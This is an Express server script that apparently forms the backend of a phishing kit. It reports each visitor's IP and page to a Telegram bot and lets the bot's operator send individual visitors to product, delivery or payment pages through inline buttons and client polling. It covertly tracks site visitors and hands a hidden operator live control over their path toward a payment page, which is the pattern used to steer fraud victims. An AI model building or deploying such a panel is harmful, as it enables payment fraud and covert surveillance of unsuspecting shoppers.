// server.js
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname,'public')));

// Env vars Render
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : null;

if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID non défini.');

const sessions = {}; // ip -> { page, redirect }

// Notification Telegram
async function sendTelegramNotif(data){
  if(!TELEGRAM_API || !CHAT_ID) return;
  const lines = [
    '🆕 <b>NOUVELLE INTERACTION</b>',
    `🌐 <b>IP:</b> ${data.ip}`,
    `📄 <b>Page actuelle:</b> ${data.page}`
  ];
  const text = lines.join('\n');

  const keyboard = {
    inline_keyboard: [
      [{ text: '➡️ Produit', callback_data: 'redirect|' + data.ip + '|/product.html' }],
      [{ text: '📦 Livraison', callback_data: 'redirect|' + data.ip + '|/delivery.html' }],
      [{ text: '💳 Paiement', callback_data: 'redirect|' + data.ip + '|/payment.html' }],
      [{ text: '🏠 Accueil', callback_data: 'redirect|' + data.ip + '|/' }]
    ]
  };

  try{
    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode:'HTML',
        reply_markup: keyboard
      })
    });
  } catch(err){
    console.error('Erreur Telegram:', err);
  }
}

// Helper IP v4
function getIPv4(req){
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const match = ip.match(/\b\d{1,3}(\.\d{1,3}){3}\b/);
  return match ? match[0] : ip;
}

// Visite page
app.get('/api/visit', (req,res)=>{
  const ip = getIPv4(req);
  sessions[ip] = sessions[ip] || { page: 'Accueil', redirect: null };
  sendTelegramNotif({ ip, page: 'Accueil' });
  res.json({ ok:true });
});

// Endpoint status (polling)
app.get('/api/status', (req,res)=>{
  const ip = getIPv4(req);
  if(!sessions[ip]) return res.json({ redirect: null });
  const r = sessions[ip].redirect || null;
  res.json({ redirect: r });
});

// Telegram Webhook
app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
  const body = req.body;
  if(body.callback_query){
    const cb = body.callback_query;
    const parts = (cb.data || '').split('|');
    const action = parts[0];
    const ip = parts[1];
    const url = parts[2];

    if(action === 'redirect'){
      if(sessions[ip]){
        sessions[ip].redirect = url;
        sessions[ip].page = 'Redirection admin vers ' + url;
        sendTelegramNotif({ ip, page: sessions[ip].page });

        await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ callback_query_id: cb.id, text: 'Redirection envoyée au visiteur.' })
        });
      } else {
        await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ callback_query_id: cb.id, text: 'IP introuvable.' })
        });
      }
    }
  }
  res.sendStatus(200);
});

// Servir index
app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'public','index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log('Server ready on', PORT));
